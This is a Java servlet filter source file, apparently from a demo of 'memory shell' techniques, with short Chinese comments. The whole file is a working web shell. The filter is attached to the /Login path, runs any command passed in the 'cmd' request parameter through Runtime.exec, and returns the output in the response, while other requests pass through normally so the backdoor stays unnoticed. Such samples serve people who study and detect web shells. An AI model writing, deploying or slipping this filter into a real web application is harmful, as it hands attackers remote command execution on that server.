// src/main/java/Filter_memshell.java
package example.demo;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;

@WebFilter(filterName = "Filter_memshell",
    urlPatterns = "/Login"
)

public class Filter_memshell implements Filter {
    private String message;
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        message = "调用 Filter_mem";
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        PrintWriter printWriter = response.getWriter();
        // 执行命令
        if(cmd != null) {
            InputStream ins = Runtime.getRuntime().exec(cmd).getInputStream();
            BufferedInputStream bins = new BufferedInputStream(ins);
            response.setContentType("text/html;charset=UTF-8");
            printWriter.write("Filter_memshell 被执行");
            int len;
            while ((len = bins.read()) != -1) {
                printWriter.write(len);
            }
            return;
        }
        // 放行请求
        chain.doFilter(request,response);
    }

    @Override
    public void destroy() {
    }
}
